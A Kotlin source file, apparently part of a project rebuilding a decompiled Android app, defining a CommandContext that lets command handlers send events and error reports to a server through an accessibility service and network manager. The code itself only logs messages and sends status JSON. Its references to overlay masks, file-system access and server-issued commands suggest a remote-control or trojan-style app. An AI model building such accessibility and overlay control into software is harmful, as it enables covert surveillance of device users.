package com.storm.safe.rock.service.modules.command

import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.NetworkManager
import org.json.JSONObject

/**
 * Context wrapper providing access to the service and network manager for command handlers.
 *
 * Reverse-engineered from JADX: uz0 (service context holder).
 * Vendor uz0 holds:
 * - f60536a0: dqtvuisjd (MyAccessibilityService)
 * - m214869a5(): C0323a8 (NetworkManager)
 * - m214866a2(): C1496yx (FileSystemManager)
 * - m214868a4(): fd0 (MaskOverlayManager)
 * - Various utility methods
 *
 * vendor: We provide a simpler context wrapper for Phase 8.
 */
open class CommandContext(
    val service: MyAccessibilityService?,
    val networkManager: NetworkManager?
) {
    /**
     * Send an event to the server via NetworkManager.
     * Vendor: c0323a8.m211658c4(eventType, data)
     */
    open fun sendEvent(eventType: String, data: JSONObject) {
        try {
            networkManager?.sendEvent(eventType, data)
        } catch (e: Exception) {
            android.util.Log.e("CommandContext", "发送事件失败", e)
        }
    }

    /**
     * Emit a local event to the service for internal routing.
     * Vendor: uz0Var.f60536a0.m211515l2(type, pairs)
     */
    fun emitLocalEvent(type: String, data: Map<String, Any?>) {
        android.util.Log.d("CommandContext", "Local event: $type, data=$data")
        // vendor: Vendor wires to service's internal event bus (MainOrchestrator dispatch).
        // Wire: service?.onLocalEvent(type, data)
        // Currently dispatches locally via Log — will be wired when MainOrchestrator
        // exposes emitLocalEvent method.
    }

    /**
     * Report command result back to the server.
     * Vendor: uz0Var.m214878b4(requestId) — sends error when local-service unavailable.
     */
    fun reportLocalServiceUnavailable(requestId: String) {
        android.util.Log.w("CommandContext", "local-service 未连接, requestId=$requestId")
        // vendor: Vendor sends error response via NetworkManager with the request ID.
        // Wire: networkManager?.sendEvent("command_error", errorJson)
        try {
            val errorData = JSONObject().apply {
                put("success", false)
                put("requestId", requestId)
                put("error", "local-service 未连接")
            }
            sendEvent("command_error", errorData)
        } catch (e: Exception) {
            android.util.Log.e("CommandContext", "发送 local-service 未连接错误失败", e)
        }
    }
}
